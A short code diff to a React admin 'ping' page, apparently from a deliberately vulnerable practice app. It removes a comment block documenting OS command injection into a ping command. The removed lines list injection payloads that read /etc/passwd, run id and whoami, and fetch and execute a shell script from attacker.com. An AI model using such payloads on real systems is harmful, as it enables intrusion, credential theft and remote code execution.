@@ -2,16 +2,6 @@ import { useState } from 'react';
 import { useAuth } from '../context/AuthContext';
 import axios from 'axios';
 
-/**
- * VULN NOTES:
- * - OS Command Injection:  The "host" value is passed directly to
- *   child_process.exec(`ping -c 4 ${host}`).
- *   Exploit examples:
- *     127.0.0.1; cat /etc/passwd
- *     127.0.0.1 && whoami
- *     $(id)
- *     127.0.0.1; curl http://attacker.com/shell.sh | sh
- */
 export default function AdminPing() {
   const { token } = useAuth();
 
@@ -60,7 +50,7 @@ export default function AdminPing() {
         </button>
       </form>
 
-      {/* Quick-access buttons */}
+      { }
       <div className="flex gap-1 mb-3" style={{ flexWrap: 'wrap' }}>
         {[
           '127.0.0.1',
